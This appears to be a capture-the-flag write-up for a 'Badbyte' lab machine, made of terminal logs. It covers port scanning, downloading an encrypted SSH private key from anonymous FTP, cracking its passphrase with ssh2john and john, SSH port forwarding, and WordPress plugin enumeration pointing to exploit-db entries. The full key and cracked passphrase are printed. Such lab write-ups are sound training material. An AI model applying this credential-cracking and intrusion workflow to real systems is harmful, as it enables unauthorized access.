# Badbyte

<br/>

### RustScan/NMAP SCAN

```
root@ip-10-10-91-62:~# rustscan --range 0-65535 -a 10.10.165.105 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
\U0001f30dHACK THE PLANET\U0001f30d

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.165.105:22
Open 10.10.165.105:30024
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-05 15:51 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:51
Completed NSE at 15:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:51
Completed NSE at 15:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:51
Completed NSE at 15:51, 0.00s elapsed
Initiating Ping Scan at 15:51
Scanning 10.10.165.105 [2 ports]
Completed Ping Scan at 15:51, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:51
Completed Parallel DNS resolution of 1 host. at 15:51, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:51
Scanning ip-10-10-165-105.eu-west-1.compute.internal (10.10.165.105) [2 ports]
Discovered open port 22/tcp on 10.10.165.105
Discovered open port 30024/tcp on 10.10.165.105
Completed Connect Scan at 15:51, 0.00s elapsed (2 total ports)
Initiating Service scan at 15:51
Scanning 2 services on ip-10-10-165-105.eu-west-1.compute.internal (10.10.165.105)
Completed Service scan at 15:51, 0.21s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.165.105.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:51
NSE: [ftp-bounce 10.10.165.105:30024] PORT response: 500 Illegal PORT command.
Completed NSE at 15:51, 2.56s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:51
Completed NSE at 15:51, 0.08s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:51
Completed NSE at 15:51, 0.00s elapsed
Nmap scan report for ip-10-10-165-105.eu-west-1.compute.internal (10.10.165.105)
Host is up, received conn-refused (0.057s latency).
Scanned at 2021-08-05 15:51:37 UTC for 3s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:a2:ed:93:4b:9c:bf:bb:33:4d:48:0d:fe:a4:de:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9/A7kkuN5E+SS1C6w1NfeY196Rj4Y1Yx7njNCwNaCgIv8m+V+7MTHsRn3txLXRTHXErMqW3ypCmmjuY3O40kAragZSgA/XhdesGxGVa0szHK7H4fB28uQiyZgkOfIt/12kGaHB3iGwOeex2Hdg6ct4FdxTWKgDvuKZSLVoPXG66R8SOHql2cXfUtzyUMNJTTqoUED69soEJVG2ctfPKXi4BfFqM3OK2HgKzbmcSPXlLUTNhlcvjPuTa0kMRqiNTMVdP0PjSFdoaMviXHiznW7Fn6NHe3R/vIQt8Ac05Mdvim21QjRpJ4pm7v5+q1wXCJxGG6Ov71yThKP6yZ4ByMl
|   256 22:72:00:36:eb:37:12:9f:5a:cc:c2:73:e0:4f:f1:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM9QUKykbzCSI7+PgoVzHNKOVIWf+zm0LN/f4n0VJc/P0J9TzLImkYHIOCnRFpNUPtiWGXbHXi67FQxEpgZMReo=
|   256 78:1d:79:dc:8d:41:f6:77:60:65:f5:74:b6:cc:8b:6d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrvf1zJBhqU1RxUCYuTgoIy+7NzCqZeFWV67bt8+APV
30024/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          1743 Mar 23 20:03 id_rsa
|_-rw-r--r--    1 ftp      ftp            78 Mar 23 20:09 note.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.91.62
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:51
Completed NSE at 15:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:51
Completed NSE at 15:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:51
Completed NSE at 15:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.64 seconds

```

### FTP Enumeration

```
root@ip-10-10-103-237:~# ftp 10.10.167.94 30024
Connected to 10.10.167.94.
220 (vsFTPd 3.0.3)
Name (10.10.167.94:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Mar 23 20:09 .
drwxr-xr-x    2 ftp      ftp          4096 Mar 23 20:09 ..
-rw-r--r--    1 ftp      ftp          1743 Mar 23 20:03 id_rsa
-rw-r--r--    1 ftp      ftp            78 Mar 23 20:09 note.txt
226 Directory send OK.
ftp> lcd Desktop/
Local directory now /root/Desktop
ftp> mget *
mget id_rsa? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1743 bytes).
226 Transfer complete.
1743 bytes received in 0.00 secs (2.8709 MB/s)
mget note.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (78 bytes).
226 Transfer complete.
78 bytes received in 0.00 secs (132.9352 kB/s)
ftp> exit
221 Goodbye.

root@ip-10-10-103-237:~# cd Desktop/
root@ip-10-10-103-237:~/Desktop# ls -la
total 32
drwxr-xr-x  3 root root 4096 Aug  3 15:18  .
drwxr-xr-x 35 root root 4096 Aug  3 14:52  ..
lrwxrwxrwx  1 root root    5 Sep 10  2020 'Additional Tools' -> /opt/
-rw-r--r--  1 root root 1743 Aug  3 15:18  id_rsa
-rwxr-xr-x  1 root root  173 Aug 15  2020  mozo-made-15.desktop
-rw-r--r--  1 root root   21 Aug  3 15:05  nikto.txt
-rw-r--r--  1 root root  101 Aug  3 14:58  nmap.txt
-rw-r--r--  1 root root   78 Aug  3 15:18  note.txt
drwxr-xr-x  9 root root 4096 Mar 18 18:03  Tools
root@ip-10-10-103-237:~/Desktop# cat note.txt
I always forget my password. Just let me store an ssh key here.
- errorcauser

root@ip-10-10-103-237:~/Desktop# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,25B4B9725AB330EC

LGINB6oiLaGhDgr5D0+9C7+AJTyQbIlBNu8rAYNtlwvn7uN2z5L17esJRr0/PEW/
4NvSoR5TeSRkyufK2mLJU0K7uscPx1JE9Lk9excqhK6N7Sau+v0b/AC3lAGzsnrf
2ztSYVcoooTt9sIDQ/+GmiIrM7rnQMkm20QapnUvUrkThJ/rB3lY3JXayfVWnvuC
Rtke/t20R82D0MFfGD3d57nZ3Q92P7tu35/azcKeR1nJq4UyIgRjdS/3wFA+NwJh
fxMNL14mgYdaBFuhKsj6jv0Ed/AsCUhrB9VcPPkHCaawv386oUv6JDLg/jEExiQc
V88vRUoFglW5a6FpfV/UPrySr4oGoSHTToBFkTQkMKg8FM3vpQXUw8CpENyYr4qj
BFMnKWDR1vuzwEITVNYunIRe9DxbO1mzgEyDWyyX9JUNNCpfWiwLx/MqNzKvkBdD
nqDGt8imMao82j77nmT5H8D+EkaCfze9SBrPPDtKm07mD+iO8ULWnIgRMtAykpj2
SYCg5CCadtXXsjuupR89Kbp8c6V+s3lsYZPp8QZQbiAgr3GqwSpat/7ZvCySzB37
0JmKjrapijObX03XRyOiGXxsUk+slNwnkWIh8Usl8YyD/Vmeg9Qdxxn6EpKy/vcY
dsQQAFYQcbKvYndnNIXnyKTsOYo6Qo8AoRzuWjkaOrRJoZoUJ6FEZED0NMXkgO2D
SCtS98+tRH2PXKajeYi7LXeRB5MOybhshAtM4ogMuuNe4PQfEePuZAInjAsdkLl1
y1RfoCQC9x6OIvd5ONVBpZ5ilNLxthj4MOXAhPPOnCtl5EvXA8oaOXFdDyM33UbA
/oTurtIzT0+UW+Am8jcFQLrBaKIXXZtkqdVjiAXoophbSKoYZzTfZsLVt1DHhf9h
H2mkT3gtKZVjNvkaEhE+wNQL2Dto6VA/xpI8Ug4cShsUwmdrRu3XBTf5NFPEcr1u
CersQnKRV5JG84rcI2J+XKZglG/aBRSnK3rnUPzJjA1pZCZdsmwjvYt2tPzsKJLB
5c8FU+XS3a20QRtMTkHb624pwjKemZ03VxSGSuvRJLvKZ43XMKvJ6zuNHZNUkU13
I6Ld/IIUlv6xwHFEOLg1hIqn3gl9uVzZ2fHDC+9AWLuJqPSa22sOHJ3FYlXaWQt4
BcYkLXvaO3a8btpgD/lwvMPpJZHHfuex1GVMqt208CZMQmdTtRB618rsDZnWxND8
oWRC0uHns8gn9qdeXbjCZx2l+VzLT5Lk/19zBZsBtFIyd5Mj+he+BkDPVMvUNKwY
97Y5v6F6PbJrAVXvjGo6k6+cIXr97Wdojotw+xR/vUdGhjOclZPmjUbDmFFLELIK
ZcWgXCOCNdP4Unrh2c96PYaY/GqmeGl0C206A8t4dbfe/pr1wjklWWRXp+O02QJ+
o3c/PC6Za8IUca8VvmpAT0M1sAiMFTeDWLMSL6Z1CxH1cLVGpSf7ITRFIiDHLGDq
v6fSxb2wsx+qDnk4tO25bXq37HqqSBNw0/NyjOWe//5QE0Q5PWuoEVP/huCKcFHb
mTDaYO2KwZXCse7derYJ0eWpKiiKcmGwmi57m+uvTka+o8xA928/xw==
-----END RSA PRIVATE KEY-----

root@ip-10-10-103-237:~/Desktop# chmod 600 id_rsa
root@ip-10-10-103-237:~/Desktop#
root@ip-10-10-103-237:~/Desktop# ssh2john id_rsa > hash.txt
ssh2john: command not found
root@ip-10-10-103-237:~/Desktop# locate ssh2john
/opt/john/ssh2john.py
root@ip-10-10-103-237:~/Desktop# which python
/usr/bin/python
root@ip-10-10-103-237:~/Desktop# which python3
/usr/bin/python3
root@ip-10-10-103-237:~/Desktop# python /opt/john/ssh2john.py id_rsa > hash.txt
root@ip-10-10-103-237:~/Desktop# cat hash.txt
id_rsa:$sshng$0$8$25B4B9725AB330EC$1192$2c620d07aa222da1a10e0af90f4fbd0bbf80253c906c894136ef2b01836d970be7eee376cf92f5edeb0946bd3f3c45bfe0dbd2a11e53792464cae7cada62c95342bbbac70fc75244f4b93d7b172a84ae8ded26aefafd1bfc00b79401b3b27adfdb3b52615728a284edf6c20343ff869a222b33bae740c926db441aa6752f52b913849feb077958dc95dac9f5569efb8246d91efeddb447cd83d0c15f183ddde7b9d9dd0f763fbb6edf9fdacdc29e4759c9ab8532220463752ff7c0503e3702617f130d2f5e2681875a045ba12ac8fa8efd0477f02c09486b07d55c3cf90709a6b0bf7f3aa14bfa2432e0fe3104c6241c57cf2f454a058255b96ba1697d5fd43ebc92af8a06a121d34e804591342430a83c14cdefa505d4c3c0a910dc98af8aa30453272960d1d6fbb3c0421354d62e9c845ef43c5b3b59b3804c835b2c97f4950d342a5f5a2c0bc7f32a3732af9017439ea0c6b7c8a631aa3cda3efb9e64f91fc0fe1246827f37bd481acf3c3b4a9b4ee60fe88ef142d69c881132d0329298f64980a0e4209a76d5d7b23baea51f3d29ba7c73a57eb3796c6193e9f106506e2020af71aac12a5ab7fed9bc2c92cc1dfbd0998a8eb6a98a339b5f4dd74723a2197c6c524fac94dc27916221f14b25f18c83fd599e83d41dc719fa1292b2fef71876c41000561071b2af6277673485e7c8a4ec398a3a428f00a11cee5a391a3ab449a19a1427a1446440f434c5e480ed83482b52f7cfad447d8f5ca6a37988bb2d779107930ec9b86c840b4ce2880cbae35ee0f41f11e3ee6402278c0b1d90b975cb545fa02402f71e8e22f77938d541a59e6294d2f1b618f830e5c084f3ce9c2b65e44bd703ca1a39715d0f2337dd46c0fe84eeaed2334f4f945be026f2370540bac168a2175d9b64a9d5638805e8a2985b48aa186734df66c2d5b750c785ff611f69a44f782d29956336f91a12113ec0d40bd83b68e9503fc6923c520e1c4a1b14c2676b46edd70537f93453c472bd6e09eaec427291579246f38adc23627e5ca660946fda0514a72b7ae750fcc98c0d6964265db26c23bd8b76b4fcec2892c1e5cf0553e5d2ddadb4411b4c4e41dbeb6e29c2329e999d375714864aebd124bbca678dd730abc9eb3b8d1d9354914d7723a2ddfc821496feb1c0714438b835848aa7de097db95cd9d9f1c30bef4058bb89a8f49adb6b0e1c9dc56255da590b7805c6242d7bda3b76bc6eda600ff970bcc3e92591c77ee7b1d4654caaddb4f0264c426753b5107ad7caec0d99d6c4d0fca16442d2e1e7b3c827f6a75e5db8c2671da5f95ccb4f92e4ff5f73059b01b45232779323fa17be0640cf54cbd434ac18f7b639bfa17a3db26b0155ef8c6a3a93af9c217afded67688e8b70fb147fbd474686339c9593e68d46c398514b10b20a65c5a05c238235d3f8527ae1d9cf7a3d8698fc6aa67869740b6d3a03cb7875b7defe9af5c23925596457a7e3b4d9027ea3773f3c2e996bc21471af15be6a404f4335b0088c15378358b3122fa6750b11f570b546a527fb2134452220c72c60eabfa7d2c5bdb0b31faa0e7938b4edb96d7ab7ec7aaa481370d3f3728ce59efffe501344393d6ba81153ff86e08a7051db9930da60ed8ac195c2b1eedd7ab609d1e5a92a288a7261b09a2e7b9bebaf4e46bea3cc40f76f3fc7

root@ip-10-10-103-237:~/Desktop# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cupcake          (id_rsa)
1g 0:00:00:22 DONE (2021-08-03 15:30) 0.04539g/s 651007p/s 651007c/s 651007C/s *7¡Vamos!
Session completed.
root@ip-10-10-103-237:~/Desktop#

```

```
root@ip-10-10-48-179:~# proxychains nmap -sT 127.0.0.1 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-04 17:05 BST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00079s latency).
Not shown: 997 closed ports
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
3306/tcp open mysql

Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
root@ip-10-10-48-179:~#

```

```

root@ip-10-10-48-179:~/Desktop# ssh -i id_rsa errorcauser@10.10.144.151 -L 8080:127.0.0.1:80
Enter passphrase for key 'id_rsa':
bind: Address already in use
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-139-generic x86_64)

- Documentation: https://help.ubuntu.com
- Management: https://landscape.canonical.com
- Support: https://ubuntu.com/advantage

System information as of Wed Aug 4 16:09:53 UTC 2021

System load: 0.0 Processes: 96
Usage of /: 23.2% of 18.57GB Users logged in: 0
Memory usage: 64% IP address for eth0: 10.10.144.151
Swap usage: 0%

0 packages can be updated.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/\*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/\*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash-4.4$ ls -la
total 48
drwxr-xr-x 8 root root 4096 Mar 23 21:30 .
drwxr-xr-x 8 root root 4096 Mar 23 21:30 ..
lrwxrwxrwx 1 root root 9 Mar 23 21:18 .bash_history -> /dev/null
-rw-r--r-- 1 errorcauser errorcauser 220 Apr 4 2018 .bash_logout
-rw-r--r-- 1 errorcauser errorcauser 3771 Apr 4 2018 .bashrc
-rw-r--r-- 1 errorcauser errorcauser 807 Apr 4 2018 .profile
drwx------ 2 errorcauser errorcauser 4096 Mar 23 20:11 .ssh
drwxr-xr-x 2 root root 4096 Mar 23 20:42 bin
drwxr-xr-x 2 root root 4096 Mar 23 20:30 dev
drwxr-xr-x 2 root root 4096 Mar 23 20:33 etc
drwxr-xr-x 3 root root 4096 Mar 23 20:33 lib
drwxr-xr-x 3 root root 4096 Mar 23 20:42 lib64
-rw-r--r-- 1 root root 245 Mar 23 21:30 note.txt
-bash-4.4$ cat note.txt
Hi Error!
I've set up a webserver locally so no one outside could access it.
It is for testing purposes only. There are still a few things I need to do like setting up a custom theme.
You can check it out, you already know what to do.
-Cth
:)

-bash-4.4$
```

### Task 1: Deploy the machine

```

1. Wait 2-3 minutes for the VM to boot up.
   Ans: No Answer Needed

```

```
# Nmap 7.60 scan initiated Sun Aug  8 15:44:21 2021 as: nmap -p 8080 --script http-wordpress-enum --script-args type=plugins,search-limit=1500 -oN Desktop/nmap.txt 127.0.0.1
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000044s latency).

PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-wordpress-enum:
| Search limited to top 1500 themes/plugins
|   plugins
|     duplicator 1.3.26
|_    wp-file-manager 6.0

# Nmap done at Sun Aug  8 15:44:22 2021 -- 1 IP address (1 host up) scanned in 0.85 seconds
```

    duplicator 1.3.26 (https://www.exploit-db.com/exploits/49288)
    wp-file-manager 6.0 (https://www.exploit-db.com/exploits/49178)
